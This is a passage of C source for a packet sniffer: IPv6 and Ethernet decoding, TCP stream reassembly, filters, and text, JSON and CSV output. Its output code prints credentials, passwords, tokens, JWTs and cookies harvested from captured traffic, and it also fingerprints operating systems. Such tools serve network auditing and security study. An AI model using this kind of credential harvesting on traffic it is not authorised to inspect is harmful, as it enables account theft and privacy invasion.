    else if (tot < ihl) { p->err = "bad IPv4 total length"; p->malformed = 1; return; }
    else l4len = tot - ihl;
    if (l4len > avail) { /* capture cut short; use what we have */ }

    if (p->frag_off > 0) {
        snprintf(p->disp, sizeof p->disp, "IP-FRAG");
        snprintf(p->primary, sizeof p->primary, "ip");
        p->payload = b + ihl;
        p->plen = l4len ? l4len : avail;
        p->avail = avail;
        return;
    }
    decode_l4(p, b + ihl, avail, l4len, nh, 0);
}

static void decode_ipv6(packet_t *p, const uint8_t *b, size_t len) {
    if (len < 40) { p->err = "runt IPv6"; p->malformed = 1; return; }
    if ((b[0] >> 4) != 6) { p->err = "bad IPv6 version"; p->malformed = 1; return; }
    p->ip_ver = 6;
    p->ttl = b[7];                       /* hop limit */
    uint16_t plen = rd16(b + 4);
    memcpy(p->src, b + 8, 16);
    memcpy(p->dst, b + 24, 16);
    inet_ntop(AF_INET6, p->src, p->src_s, sizeof p->src_s);
    inet_ntop(AF_INET6, p->dst, p->dst_s, sizeof p->dst_s);

    size_t off = 40;
    uint8_t nxt = b[6];
    int nonfirst = 0;
    for (int hops = 0; hops < 8; hops++) {
        if (nxt == 0 || nxt == 43 || nxt == 44 || nxt == 51 || nxt == 60) {
            if (off + 2 > len) { p->err = "truncated IPv6 ext header"; p->malformed = 1; break; }
            size_t elen = (nxt == 44) ? 8
                        : (nxt == 51) ? ((size_t)b[off + 1] + 2) * 4
                                      : ((size_t)b[off + 1] + 1) * 8;
            if (off + elen > len) { p->err = "truncated IPv6 ext header"; p->malformed = 1; break; }
            uint8_t nn = b[off];
            {
                const char *en = nxt == 0  ? "hop-by-hop"
                               : nxt == 43 ? "routing"
                               : nxt == 44 ? "frag"
                               : nxt == 51 ? "ah"
                                           : "dst-opts";
                lst(p->ext_s, sizeof p->ext_s, "%s", en);
            }
            if (nxt == 44) {
                uint16_t fo = rd16(b + off + 2);
                p->frag_off = (fo >> 3) * 8;
                p->mf = fo & 1;
                if (p->frag_off) nonfirst = 1;
            }
            nxt = nn;
            off += elen;
        } else break;
    }
    size_t avail = off <= len ? len - off : 0;
    if (p->malformed) {
        p->payload = b + (off <= len ? off : len);
        p->plen = avail; p->avail = avail;
        return;
    }
    if (nxt == 59) {
        snprintf(p->disp, sizeof p->disp, "IPv6");
        snprintf(p->primary, sizeof p->primary, "ipv6");
        p->payload = b + off; p->plen = avail; p->avail = avail;
        return;
    }
    size_t l4len = 0;
    if (plen >= off - 40) l4len = plen - (off - 40);
    if (nonfirst) {
        snprintf(p->disp, sizeof p->disp, "IP-FRAG");
        snprintf(p->primary, sizeof p->primary, "ipv6");
        p->payload = b + off;
        p->plen = l4len ? l4len : avail;
        p->avail = avail;
        return;
    }
    decode_l4(p, b + off, avail, l4len, nxt, 1);
}

static void decode(packet_t *p, const uint8_t *f, size_t cap, size_t wire,
                   const struct timespec *ts, const char *ifname, int have_dir, int out) {
    memset(p, 0, sizeof *p);
    p->caplen = cap; p->wirelen = wire;
    p->ts = *ts;
    p->have_dir = have_dir; p->outgoing = out;
    p->ip_csum = -1; p->l4_csum = -1; p->vlan = -1;
    p->stream_id = -1;
    snprintf(p->ifname, sizeof p->ifname, "%s", ifname ? ifname : "?");

    if (cap < 14) { p->err = "runt Ethernet frame"; p->malformed = 1;
        snprintf(p->disp, sizeof p->disp, "BAD"); snprintf(p->primary, sizeof p->primary, "other");
        return; }
    memcpy(p->eth_dst, f, 6);
    memcpy(p->eth_src, f + 6, 6);
    p->has_l2 = 1;

    uint16_t et = rd16(f + 12);
    size_t off = 14;
    if (et == 0x8100 || et == 0x88a8) {
        if (cap < 18) { p->err = "runt VLAN tag"; p->malformed = 1; return; }
        p->vlan = rd16(f + 14) & 0x0fff;
        et = rd16(f + 16);
        off = 18;
    }
    p->etype = et;

    if (et <= 1500) {   /* 802.3 length field */
        snprintf(p->disp, sizeof p->disp, "802.3");
        snprintf(p->primary, sizeof p->primary, "other");
        p->payload = f + off; p->plen = cap - off; p->avail = cap - off;
        return;
    }
    switch (et) {
        case 0x0800: decode_ipv4(p, f + off, cap - off); break;
        case 0x86dd: decode_ipv6(p, f + off, cap - off); break;
        case 0x0806: case 0x8035: decode_arp(p, f + off, cap - off); break;
        default: {
            const char *nm = ethertype_name(et);
            snprintf(p->disp, sizeof p->disp, "%s", nm ? nm : "OTHER");
            snprintf(p->primary, sizeof p->primary, "other");
            p->payload = f + off; p->plen = cap - off; p->avail = cap - off;
            break;
        }
    }
    if (!p->disp[0]) { snprintf(p->disp, sizeof p->disp, "BAD");
        snprintf(p->primary, sizeof p->primary, "other"); }
    if (!p->primary[0]) snprintf(p->primary, sizeof p->primary, "other");

    /* post-decode analysis: harvesting, fingerprinting, recon, name learning */
    harvest(p);
    finger_observe(p);
    name_learn(p);
    talkers_observe(p);
}

/* ---------- TCP stream tracking / reassembly ----------
 * Streams are keyed by the unordered endpoint pair (canonical a <= b), so
 * both directions of a flow land in one entry.  Per direction we keep the
 * next expected sequence number plus a small queue of out-of-order
 * segments; in-order data is emitted (follow mode) and forgotten, so
 * memory stays bounded no matter how long the capture runs.            */
#define NSTREAM 4096          /* power of two */
#define NPEND   8             /* out-of-order segments held per direction */

typedef struct {
    uint8_t  a[16], b[16];    /* canonical endpoints (v4 uses first 4 bytes) */
    uint16_t ap, bp;
    int      fam;             /* 4 or 6 */
} fkey_t;

typedef struct {
    uint32_t seq; size_t len; uint8_t *d;
} fpend_t;

typedef struct {
    uint32_t nxt;             /* next in-order sequence number */
    int      have;            /* nxt is initialized */
    fpend_t  pend[NPEND];
    int      np;
    unsigned long long bytes;
} fdir_t;

typedef struct {
    int used;
    fkey_t key;
    unsigned id;
    fdir_t d[2];              /* d[0] = a->b, d[1] = b->a */
    struct timespec t0, t1;
    unsigned long long pkts, bytes;
    int syn, fin, rst;
    int lastdir;              /* follow mode: direction of last printed chunk */
    int closed_seen;
    unsigned long long last;  /* recency stamp for full-table eviction */
} fent_t;

static fent_t ftab[NSTREAM];
static unsigned fnxt = 1;
static unsigned long long fnow = 1;

/* order the two endpoints canonically; returns direction of src (0 or 1) */
static int key_build(fkey_t *k, const packet_t *p) {
    memset(k, 0, sizeof *k);
    k->fam = p->ip_ver;
    int cmp = memcmp(p->src, p->dst, 16);
    if (!cmp) cmp = p->sport < p->dport ? -1 : p->sport > p->dport ? 1 : 0;
    if (cmp <= 0) {
        memcpy(k->a, p->src, 16); memcpy(k->b, p->dst, 16);
        k->ap = p->sport; k->bp = p->dport;
        return 0;
    }
    memcpy(k->a, p->dst, 16); memcpy(k->b, p->src, 16);
    k->ap = p->dport; k->bp = p->sport;
    return 1;
}

static unsigned key_hash(const fkey_t *k) {
    unsigned h = 2166136261u;
    for (int i = 0; i < 16; i++) {
        h = (h ^ k->a[i]) * 16777619u;
        h = (h ^ k->b[i]) * 16777619u;
    }
    h = (h ^ (k->ap & 0xff)) * 16777619u;
    h = (h ^ (k->ap >> 8)) * 16777619u;
    h = (h ^ (k->bp & 0xff)) * 16777619u;
    h = (h ^ (k->bp >> 8)) * 16777619u;
    return h;
}

static void key_ep(const fkey_t *k, int side, char *out, size_t sz) {
    char ip[INET6_ADDRSTRLEN];
    inet_ntop(k->fam == 4 ? AF_INET : AF_INET6, side ? k->b : k->a, ip, sizeof ip);
    uint16_t port = side ? k->bp : k->ap;
    if (k->fam == 6) snprintf(out, sz, "[%s]:%u", ip, port);
    else snprintf(out, sz, "%s:%u", ip, port);
}

static int is_follow(const fent_t *e) {
    return cfg.follow >= 0 &&
           (cfg.follow == 0 || (unsigned)cfg.follow == e->id);
}

static void f_free_pend(fdir_t *d) {
    for (int i = 0; i < d->np; i++) free(d->pend[i].d);
    d->np = 0;
}

static fent_t *f_lookup(const fkey_t *k, int create, const packet_t *p) {
    unsigned h = key_hash(k) & (NSTREAM - 1);
    unsigned free_idx = (unsigned)-1;
    for (unsigned probe = 0; probe < NSTREAM; probe++) {
        fent_t *e = &ftab[(h + probe) & (NSTREAM - 1)];
        if (!e->used) {
            if (free_idx == (unsigned)-1) free_idx = (h + probe) & (NSTREAM - 1);
            break;
        }
        if (!memcmp(&e->key, k, sizeof *k)) return e;
    }
    if (!create) return NULL;
    if (free_idx == (unsigned)-1) {              /* table full: evict LRU */
        unsigned long long oldest = ~0ULL;
        for (unsigned i = 0; i < NSTREAM; i++)
            if (ftab[i].used && ftab[i].last < oldest) { oldest = ftab[i].last; free_idx = i; }
        f_free_pend(&ftab[free_idx].d[0]);
        f_free_pend(&ftab[free_idx].d[1]);
    }
    fent_t *e = &ftab[free_idx];
    memset(e, 0, sizeof *e);
    e->used = 1;
    e->key = *k;
    e->id = fnxt++;
    e->lastdir = -1;
    e->t0 = e->t1 = p->ts;
    return e;
}

/* emit a reassembled chunk (follow mode prints it as text) */
static void f_emit(fent_t *e, int dir, const uint8_t *d, size_t n) {
    if (!n || !is_follow(e)) return;
    if (e->lastdir != dir) {
        char frm[80], to[80];
        key_ep(&e->key, dir ? 1 : 0, frm, sizeof frm);
        key_ep(&e->key, dir ? 0 : 1, to, sizeof to);
        printf("%s>>> %s -> %s%s\n", dir ? CGRN : CBLU, frm, to, C0);
        e->lastdir = dir;
    }
    for (size_t i = 0; i < n; i++) {
        unsigned c = d[i];
        if (c == '\r') { if (i + 1 < n && d[i + 1] == '\n') continue; putchar('\n'); }
        else if (c == '\n') putchar('\n');
        else if (c == '\t') putchar('\t');
        else if (c >= 32 && c < 127) putchar((int)c);
        else putchar('.');
    }
}

/* process payload of one direction against the expected sequence number */
static void f_data(fent_t *e, int dir, const packet_t *p, uint32_t seq) {
    fdir_t *d = &e->d[dir];
    if (!d->have) { d->nxt = seq; d->have = 1; }
    int32_t diff = (int32_t)(seq - d->nxt);
    if (diff <= 0) {                              /* in order (or retransmit) */
        size_t skip = diff < 0 ? (size_t)(-(int64_t)diff) : 0;
        if (skip < p->avail) {
            f_emit(e, dir, p->payload + skip, p->avail - skip);
            d->nxt += (uint32_t)(p->avail - skip);
        }
        while (d->np > 0) {                       /* drain queued out-of-order */
            fpend_t *f = &d->pend[0];
            int32_t pd = (int32_t)(f->seq - d->nxt);
            if (pd > 0) break;
            size_t psk = pd < 0 ? (size_t)(-(int64_t)pd) : 0;
            if (psk < f->len) {
                f_emit(e, dir, f->d + psk, f->len - psk);
                d->nxt += (uint32_t)(f->len - psk);
            }
            free(f->d);
            memmove(d->pend, d->pend + 1, (size_t)(d->np - 1) * sizeof *d->pend);
            d->np--;
        }
    } else {                                      /* gap: hold for later */
        if (d->np >= NPEND) {                     /* queue full: drop oldest */
            free(d->pend[0].d);
            memmove(d->pend, d->pend + 1, (size_t)(d->np - 1) * sizeof *d->pend);
            d->np--;
        }
        int at = d->np;
        for (int i = 0; i < d->np; i++)
            if ((int32_t)(seq - d->pend[i].seq) < 0) { at = i; break; }
        uint8_t *copy = malloc(p->avail ? p->avail : 1);
        if (!copy) return;
        memcpy(copy, p->payload, p->avail);
        memmove(d->pend + at + 1, d->pend + at, (size_t)(d->np - at) * sizeof *d->pend);
        d->pend[at].seq = seq;
        d->pend[at].len = p->avail;
        d->pend[at].d = copy;
        d->np++;
    }
}

static void stream_track(packet_t *p) {
    if (!p->has_tcp || !p->ip_ver) return;
    fkey_t k;
    int dir = key_build(&k, p);
    fent_t *e = f_lookup(&k, 1, p);
    if (!e) { p->stream_id = -1; return; }

    p->stream_id = (int)e->id;
    int first = (e->pkts == 0);
    e->pkts++;
    e->bytes += p->avail;
    e->d[dir].bytes += p->avail;
    e->t1 = p->ts;
    e->last = fnow++;

    if (first && is_follow(e)) {
        char A[80], B[80];
        key_ep(&e->key, 0, A, sizeof A);
        key_ep(&e->key, 1, B, sizeof B);
        printf("%s=== stream %u: %s <-> %s ===%s\n", CWHT, e->id, A, B, C0);
    }

    if (p->flags & 0x0002) {                      /* SYN: (re)start connection */
        f_free_pend(&e->d[0]);
        f_free_pend(&e->d[1]);
        e->d[0].have = e->d[1].have = 0;
        e->d[dir].nxt = p->seq + 1;               /* SYN consumes one seq number */
        e->d[dir].have = 1;
        e->syn = 1;
        e->lastdir = -1;
    }
    if ((p->flags & 0x0001) || (p->flags & 0x0004)) {   /* FIN or RST */
        if (!e->closed_seen && is_follow(e))
            printf("%s--- stream %u closed%s%s\n", CDIM, e->id,
                   (p->flags & 0x0004) ? " (RST)" : "", C0);
        e->closed_seen = 1;
    }
    if (p->flags & 0x0001) e->fin = 1;
    if (p->flags & 0x0004) e->rst = 1;

    if (p->payload && p->avail) {
        uint32_t seq = p->seq + ((p->flags & 0x0002) ? 1u : 0u);  /* SYN eats 1 */
        f_data(e, dir, p, seq);
    }
}

static void streams_cleanup(void) {
    for (unsigned i = 0; i < NSTREAM; i++) {
        f_free_pend(&ftab[i].d[0]);
        f_free_pend(&ftab[i].d[1]);
    }
}

static int fcmp_idp(const void *a, const void *b) {
    const fent_t *const *x = a, *const *y = b;
    return (int)((*x)->id - (*y)->id);
}

static void streams_stats(FILE *o) {
    static fent_t *view[NSTREAM];
    int n = 0;
    for (unsigned i = 0; i < NSTREAM; i++)
        if (ftab[i].used) view[n++] = &ftab[i];
    if (!n) return;
    qsort(view, (size_t)n, sizeof *view, fcmp_idp);
    fprintf(o, "  streams %d\n", n);
    for (int i = 0; i < n; i++) {
        if (i >= 32) { fprintf(o, "    ... and %d more\n", n - 32); break; }
        fent_t *e = view[i];
        char A[80], B[80];
        key_ep(&e->key, 0, A, sizeof A);
        key_ep(&e->key, 1, B, sizeof B);
        double dur = (double)(e->t1.tv_sec - e->t0.tv_sec) +
                     (double)(e->t1.tv_nsec - e->t0.tv_nsec) / 1e9;
        const char *stt = e->rst ? "rst" : e->fin ? "fin" : e->syn ? "open" : "mid";
        fprintf(o, "    #%-3u %-24s <-> %-24s %llu/%llu B  %llup  %.3fs  %s\n",
                e->id, A, B, e->d[0].bytes, e->d[1].bytes,
                e->pkts, dur < 0 ? 0.0 : dur, stt);
    }
}

/* ---------- filtering ---------- */
static int proto_match(const packet_t *p, const char *req) {
    if (!strcasecmp(req, "all")) return 1;
    if (!strcasecmp(req, "tcp")) return p->has_tcp;
    if (!strcasecmp(req, "udp")) return p->has_udp;
    if (!strcasecmp(req, "icmp")) return p->has_icmp && p->icmp_ver == 4;
    if (!strcasecmp(req, "icmpv6") || !strcasecmp(req, "icmp6"))
        return p->has_icmp && p->icmp_ver == 6;
    if (!strcasecmp(req, "arp")) return p->has_arp;
    if (!strcasecmp(req, "ip") || !strcasecmp(req, "ipv4")) return p->ip_ver == 4;
    if (!strcasecmp(req, "ipv6")) return p->ip_ver == 6;
    if (!strcasecmp(req, "frag")) return p->frag_off > 0 || p->mf;
    if (!strcasecmp(req, "dns")) return p->app == APP_DNS;
    if (!strcasecmp(req, "tls") || !strcasecmp(req, "https")) return p->app == APP_TLS;
    if (!strcasecmp(req, "http")) return p->app == APP_HTTP;
    if (p->l4name[0] && !strcasecmp(p->l4name, req)) return 1;
    return !strcasecmp(p->primary, req);
}

static int pass_filter(const packet_t *p) {
    if (cfg.proto && !proto_match(p, cfg.proto)) return 0;
    if (cfg.host) {
        int hit = strstr(p->src_s, cfg.host) != NULL || strstr(p->dst_s, cfg.host) != NULL;
        if (!hit && p->arp_ok)
            hit = strstr(p->arp_spa, cfg.host) != NULL || strstr(p->arp_tpa, cfg.host) != NULL;
        /* also match decoded names: DNS question, TLS SNI, HTTP Host */
        if (!hit && p->dns_name[0])   hit = strstr(p->dns_name, cfg.host) != NULL;
        if (!hit && p->tls_sni[0])    hit = strstr(p->tls_sni, cfg.host) != NULL;
        if (!hit && p->http_host[0])  hit = strstr(p->http_host, cfg.host) != NULL;
        if (!hit) return 0;
    }
    if (cfg.port >= 0) {
        if (!((p->has_tcp || p->has_udp) &&
              (p->sport == (uint16_t)cfg.port || p->dport == (uint16_t)cfg.port)))
            return 0;
    }
    return 1;
}

/* ---------- printing ---------- */
static struct timespec t_first;
static int t_have_first;

/* seconds since the first displayed packet (initializes on first call) */
static double rel_secs(const struct timespec *ts) {
    if (!t_have_first) { t_first = *ts; t_have_first = 1; return 0.0; }
    return (double)(ts->tv_sec - t_first.tv_sec) +
           (double)(ts->tv_nsec - t_first.tv_nsec) / 1e9;
}

static const char *csum_val(int v) {
    switch (v) {
        case 1:  return "ok";
        case 0:  return "bad";
        case -2: return "none";
        default: return "unknown";
    }
}

static const char *pcol(const packet_t *p) {
    if (!cfg.color) return "";
    if (p->has_tcp) return CGRN;
    if (p->has_udp) return CCYN;
    if (p->has_icmp) return p->icmp_ver == 6 ? CMAG : CYEL;
    if (p->has_arp) return CRED;
    if (p->ip_ver == 6) return CBLU;
    if (p->ip_ver == 4) return CWHT;
    return CDIM;
}
static const char *csum_str(int v) {
    static char buf[32];
    const char *txt, *col = "";
    switch (v) {
        case 1:  txt = "ok";   col = CDIM; break;
        case 0:  txt = "BAD";  col = CRED; break;
        case -2: txt = "none"; col = CDIM; break;
        default: txt = "?";    col = CYEL; break;
    }
    if (cfg.color) snprintf(buf, sizeof buf, "%s%s%s", col, txt, C0);
    else snprintf(buf, sizeof buf, "%s", txt);
    return buf;
}
static void fmt_ep(const packet_t *p, int is_src, char *out, size_t sz) {
    const char *ip = is_src ? p->src_s : p->dst_s;
    if (p->has_tcp || p->has_udp) {
        uint16_t port = is_src ? p->sport : p->dport;
        if (p->ip_ver == 6) snprintf(out, sz, "[%s]:%u", ip, port);
        else snprintf(out, sz, "%s:%u", ip, port);
        const char *svc = port_service(port, p->has_tcp);
        if (svc && is_src == 0) {
            size_t l = strlen(out);
            snprintf(out + l, sz - l, "(%s)", svc);
        }
    } else snprintf(out, sz, "%s", ip);
}

static void hexdump(const uint8_t *b, size_t n) {
    for (size_t i = 0; i < n; i += 16) {
        printf("        %s%04zx  ", CDIM, i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < n) printf("%02x ", b[i + j]); else printf("   ");
            if (j == 7) printf(" ");
        }
        printf(" |");
        for (size_t j = 0; j < 16 && i + j < n; j++) {
            unsigned c = b[i + j];
            putchar((c >= 32 && c < 127) ? (int)c : '.');
        }
        printf("%s|%s\n", CDIM, C0);
    }
}

static void print_pkt(const packet_t *p) {
    char tbuf[32];
    struct tm tm;
    localtime_r(&p->ts.tv_sec, &tm);
    strftime(tbuf, sizeof tbuf, "%H:%M:%S", &tm);

    printf("%s%s.%06ld%s", CDIM, tbuf, (long)(p->ts.tv_nsec / 1000), C0);
    if (cfg.reltime) printf(" %s+%0.6f%s", CDIM, rel_secs(&p->ts), C0);
    printf(" %s%-8s%s", CDIM, p->ifname, C0);
    if (p->stream_id > 0) printf(" %s#%d%s", CDIM, p->stream_id, C0);
    printf(" %s%-7s%s ", pcol(p), p->disp, C0);

    if (p->has_arp && p->arp_ok) {
        char m[24];
        if (p->arp_op == 1) printf("who-has %s tell %s", p->arp_tpa, p->arp_spa);
        else if (p->arp_op == 2) {
            mac_str(p->arp_sha, m, sizeof m);
            printf("%s is-at %s", p->arp_spa, m);
        } else printf("%s op=%u -> %s", p->arp_spa, p->arp_op, p->arp_tpa);
    } else if (p->ip_ver) {
        char a[144], b[144];
        fmt_ep(p, 1, a, sizeof a);
        fmt_ep(p, 0, b, sizeof b);
        printf("%s%s%s %s->%s %s%s%s", CGRN, a, C0, CDIM, C0, CGRN, b, C0);
    } else if (p->has_l2) {
        char a[24], b[24], c[24];
        mac_str(p->eth_src, a, sizeof a);
        mac_str(p->eth_dst, b, sizeof b);
        snprintf(c, sizeof c, "0x%04x", p->etype);
        printf("%s%s%s %s->%s %s%s%s", CDIM, a, C0, CDIM, C0, CDIM, b, C0);
        printf(" type=%s", ethertype_name(p->etype) ? ethertype_name(p->etype) : c);
    }

    printf("  %slen=%zu%s", CDIM, p->caplen, C0);
    if (p->wirelen != p->caplen) printf("/%zu", p->wirelen);
    if (p->vlan >= 0) printf(" %svlan=%d%s", CDIM, p->vlan, C0);
    if (p->ip_ver) printf(" %sttl=%u%s", CDIM, p->ttl, C0);
    if (p->have_dir && p->outgoing) printf(" %sTX%s", CYEL, C0);
    if (p->err) printf("  %s!%s", CYEL, C0);
    printf("\n");

    if (p->err) printf("        %s! %s%s\n", CYEL, p->err, C0);
    if (cfg.quiet) return;

    if (p->ip_ver == 4) {
        printf("        IPv4 ttl=%u", p->ttl);
        if (p->ip_id) printf(" id=0x%04x", p->ip_id);
        if (p->df) printf(" DF");
        if (p->mf) printf(" MF");
        if (p->frag_off) printf(" off=%u", p->frag_off);
        printf(" ip-csum=%s", csum_str(p->ip_csum));
        printf("\n");
    } else if (p->ip_ver == 6) {
        printf("        IPv6 hlim=%u", p->ttl);
        if (p->ext_s[0]) printf(" ext=%s", p->ext_s);
        if (p->frag_off) printf(" off=%u%s", p->frag_off, p->mf ? " MF" : "");
        printf("\n");
    }
    if (p->has_tcp) {
        printf("        seq=%u ack=%u win=%u [%s] csum=%s\n",
               p->seq, p->ack, p->win, p->flags_s, csum_str(p->l4_csum));
        if (strcmp(p->opts_s, "none")) printf("        opts: %s\n", p->opts_s);
    }
    if (p->has_udp) printf("        len=%u csum=%s\n", p->udp_len, csum_str(p->l4_csum));
    if (p->has_icmp) {
        printf("        %s code=%u csum=%s",
               p->icmp_ver == 6 ? icmp6_name(p->icmp_type) : icmp4_name(p->icmp_type),
               p->icmp_code, csum_str(p->l4_csum));
        int is_echo = (p->icmp_ver == 4 && (p->icmp_type == 0 || p->icmp_type == 8)) ||
                      (p->icmp_ver == 6 && (p->icmp_type == 128 || p->icmp_type == 129));
        if (is_echo) printf(" id=0x%04x seq=%u", p->icmp_id, p->icmp_seq);
        printf("\n");
    }
    if (p->has_arp && !p->arp_ok) {
        printf("        htype=%u ptype=0x%04x op=%u\n", p->arp_htype, p->arp_ptype, p->arp_op);
    }
    if (p->app) {
        const char *lab = p->app == APP_DNS ? "DNS" : p->app == APP_TLS ? "TLS" : "HTTP";
        printf("        %s%-4s%s %s\n", CYEL, lab, C0, p->app_s);
    }
    if (p->cred_kind) {
        printf("        %sCRED%s %s", CRED, C0, p->cred_where);
        if (p->cred_user[0]) printf(" user=%s", p->cred_user);
        if (p->cred_pass[0]) printf(" pass=%s", p->cred_pass);
        printf("\n");
    }
    if (p->token[0])   printf("        %sTOKN%s %s\n", CRED, C0, p->token);
    if (p->jwt_sub[0]) printf("        %sJWT %s %s\n", CRED, C0, p->jwt_sub);
    if (p->cookie[0])  printf("        %sCOOK%s %s\n", CMAG, C0, p->cookie);
    if (p->banner[0])  printf("        %sBANR%s %s\n", CMAG, C0, p->banner);
    if (p->os_guess[0]) printf("        %sOS  %s %s\n", CCYN, C0, p->os_guess);
    if (p->payload && p->plen && cfg.dumpbytes > 0) {
        size_t show = p->avail;
        if (show > (size_t)cfg.dumpbytes) show = (size_t)cfg.dumpbytes;
        printf("        %spayload %zu bytes%s", CDIM, p->plen, C0);
        if (p->avail < p->plen) printf(" %s(%zu captured)%s", CYEL, p->avail, C0);
        printf(":\n");
        hexdump(p->payload, show);
        if (p->plen > show)
            printf("        %s... %zu more bytes (-B to show more)%s\n", CDIM, p->plen - show, C0);
    }
}

static void json_str(const char *s) {
    putchar('"');
    for (; *s; s++) {
        unsigned char c = (unsigned char)*s;
        switch (c) {
            case '"':  fputs("\\\"", stdout); break;
            case '\\': fputs("\\\\", stdout); break;
            case '\n': fputs("\\n", stdout); break;
            case '\r': fputs("\\r", stdout); break;
            case '\t': fputs("\\t", stdout); break;
            default:
                if (c < 32 || c == 127) printf("\\u%04x", c);
                else putchar(c);
        }
    }
    putchar('"');
}

static void print_json(const packet_t *p) {
    printf("{\"ts\":%lld.%06ld,\"rel\":%.6f",
           (long long)p->ts.tv_sec, p->ts.tv_nsec / 1000, rel_secs(&p->ts));
    printf(",\"iface\":");
    json_str(p->ifname);
    if (p->have_dir) printf(",\"dir\":\"%s\"", p->outgoing ? "out" : "in");
    printf(",\"len\":%zu,\"wire\":%zu", p->caplen, p->wirelen);
    if (p->vlan >= 0) printf(",\"vlan\":%d", p->vlan);

    if (p->has_l2) {
        char m[24];
        mac_str(p->eth_src, m, sizeof m);
        printf(",\"eth.src\":"); json_str(m);
        mac_str(p->eth_dst, m, sizeof m);
        printf(",\"eth.dst\":"); json_str(m);
        const char *en = ethertype_name(p->etype);
        char eb[16];
        if (!en) { snprintf(eb, sizeof eb, "0x%04x", p->etype); en = eb; }
        printf(",\"eth.type\":"); json_str(en);
    }
    if (p->ip_ver) {
        printf(",\"ip.ver\":%d,\"src\":", p->ip_ver);
        json_str(p->src_s);
        printf(",\"dst\":");
        json_str(p->dst_s);
        printf(",\"ttl\":%u", p->ttl);
        if (p->ip_ver == 4) {
            printf(",\"ip.id\":%u,\"ip.df\":%s,\"ip.mf\":%s,\"ip.off\":%d",
                   p->ip_id, p->df ? "true" : "false",
                   p->mf ? "true" : "false", p->frag_off);
            printf(",\"ip.csum\":"); json_str(csum_val(p->ip_csum));
        } else if (p->ext_s[0]) {
            printf(",\"ipv6.ext\":"); json_str(p->ext_s);
        }
    }
    if (p->has_arp) {
        printf(",\"arp.op\":%u", p->arp_op);
        if (p->arp_ok) {
            char m[24];
            printf(",\"arp.spa\":"); json_str(p->arp_spa);
            printf(",\"arp.tpa\":"); json_str(p->arp_tpa);
            mac_str(p->arp_sha, m, sizeof m);
            printf(",\"arp.sha\":"); json_str(m);
        }
    }

    printf(",\"proto\":"); json_str(p->l4name[0] ? p->l4name : p->primary);
    if (p->has_tcp || p->has_udp) printf(",\"sport\":%u,\"dport\":%u", p->sport, p->dport);
    if (p->has_tcp) {
        printf(",\"seq\":%u,\"ack\":%u,\"win\":%u,\"flags\":",
               p->seq, p->ack, p->win);
        json_str(p->flags_s);
        printf(",\"tcp.csum\":"); json_str(csum_val(p->l4_csum));
        if (strcmp(p->opts_s, "none")) { printf(",\"tcp.opts\":"); json_str(p->opts_s); }
    }
    if (p->has_udp) {
        printf(",\"udp.len\":%u,\"udp.csum\":", p->udp_len);
        json_str(csum_val(p->l4_csum));
    }
    if (p->has_icmp) {
        printf(",\"icmp.type\":%u,\"icmp.code\":%u,\"icmp.name\":",
               p->icmp_type, p->icmp_code);
        json_str(p->icmp_ver == 6 ? icmp6_name(p->icmp_type) : icmp4_name(p->icmp_type));
    }
    if (p->stream_id > 0) printf(",\"stream\":%d", p->stream_id);

    if (p->app == APP_DNS) {
        printf(",\"app\":\"dns\",\"dns.qname\":"); json_str(p->dns_name);
        const char *tn = dns_type_name(p->dns_qtype);
        char tb[16];
        if (!tn) { snprintf(tb, sizeof tb, "TYPE%u", p->dns_qtype); tn = tb; }
        printf(",\"dns.qtype\":"); json_str(tn);
        printf(",\"dns.qr\":\"%s\"", p->dns_qr ? "response" : "query");
        if (p->dns_qr) {
            const char *rc = dns_rcode_name(p->dns_rcode);
            char rb[16];
            if (!rc) { snprintf(rb, sizeof rb, "rcode%d", p->dns_rcode); rc = rb; }
            printf(",\"dns.rcode\":"); json_str(rc);
            printf(",\"dns.answers\":%d", p->dns_an);
        }
        if (p->dns_first[0]) { printf(",\"dns.first\":"); json_str(p->dns_first); }
    } else if (p->app == APP_TLS) {
        printf(",\"app\":\"tls\",\"tls.type\":"); json_str(p->tls_type);
        printf(",\"tls.version\":"); json_str(p->tls_ver);
        if (p->tls_sni[0])  { printf(",\"tls.sni\":");  json_str(p->tls_sni); }
        if (p->tls_alpn[0]) { printf(",\"tls.alpn\":"); json_str(p->tls_alpn); }
        if (p->tls_cipher) {
            const char *cn = tls_cipher_name(p->tls_cipher);
            char cb[16];
            if (!cn) { snprintf(cb, sizeof cb, "0x%04x", p->tls_cipher); cn = cb; }
            printf(",\"tls.cipher\":"); json_str(cn);
        }
    } else if (p->app == APP_HTTP) {
        printf(",\"app\":\"http\",\"http.line\":"); json_str(p->http_line);
        if (p->http_code) printf(",\"http.code\":%d", p->http_code);
        if (p->http_host[0]) { printf(",\"http.host\":"); json_str(p->http_host); }
    }

    /* --- harvested credentials / tokens / banners --- */
    if (p->cred_kind) {
        printf(",\"cred\":{\"kind\":\"%s\"", cred_kind_name(p->cred_kind));
        printf(",\"where\":"); json_str(p->cred_where);
        if (p->cred_user[0]) { printf(",\"user\":"); json_str(p->cred_user); }
        if (p->cred_pass[0]) { printf(",\"pass\":"); json_str(p->cred_pass); }
        printf("}");
    }
    if (p->token[0])      { printf(",\"token\":");   json_str(p->token); }
    if (p->jwt_sub[0])    { printf(",\"jwt\":");     json_str(p->jwt_sub); }
    if (p->cookie[0])     { printf(",\"cookie\":");  json_str(p->cookie); }
    if (p->banner[0]) {
        printf(",\"banner\":"); json_str(p->banner);
        if (p->svc[0]) { printf(",\"service\":"); json_str(p->svc); }
    }
    if (p->os_guess[0])   { printf(",\"os\":");      json_str(p->os_guess); }

    if (p->err) { printf(",\"error\":"); json_str(p->err); }
    if (p->malformed) printf(",\"malformed\":true");

    if (p->payload && p->avail && cfg.dumpbytes > 0) {
        size_t show = p->avail;
        if (show > (size_t)cfg.dumpbytes) show = (size_t)cfg.dumpbytes;
        fputs(",\"payload\":\"", stdout);
        for (size_t i = 0; i < show; i++) printf("%02x", p->payload[i]);
        putchar('"');
    }
    printf("}\n");
}

static void csv_str(const char *s) {
    putchar('"');
    for (; *s; s++) {
        if (*s == '"') fputs("\"\"", stdout);
        else if ((unsigned char)*s < 32 || *s == 127) putchar(' ');
        else putchar(*s);
    }
    putchar('"');
}

static void print_csv(const packet_t *p) {
    static int header_done = 0;
    if (!header_done) {
        printf("ts,rel,iface,dir,proto,src,sport,dst,dport,len,vlan,info,user,pass,where,banner,os\n");
        header_done = 1;
    }
    printf("%lld.%06ld,%.6f,", (long long)p->ts.tv_sec,
           p->ts.tv_nsec / 1000, rel_secs(&p->ts));
    csv_str(p->ifname);
    putchar(',');
